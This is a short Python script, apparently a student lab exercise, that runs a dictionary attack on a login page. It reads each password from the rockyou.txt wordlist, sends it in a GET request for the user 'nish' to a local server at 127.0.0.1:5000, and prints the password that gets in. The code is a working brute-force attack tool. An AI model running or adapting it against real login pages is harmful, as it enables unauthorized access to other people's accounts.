# -*- coding: utf-8 -*-
"""
Created on Mon Dec 20 10:54:34 2021

@author: 19pt15
"""

import urllib 
import timeit

user = 'nish'

def hack():

    f = open("rockyou.txt",'r')

    while True:

        line = f.readline()
        if not line:
            break

        p = 'http://127.0.0.1:5000/welcome?username=' + user + "&pass=" + line
        page = urllib.request.urlopen(p)
        page_data = page.read().decode('utf-8')
        if page_data == "Youre' In!":
            print("Password: ", line)
                
    f.close()


if __name__ == '__main__':
    start = timeit.default_timer()
    hack()                
    stop = timeit.default_timer()
    print('Time taken to break in: ', stop - start)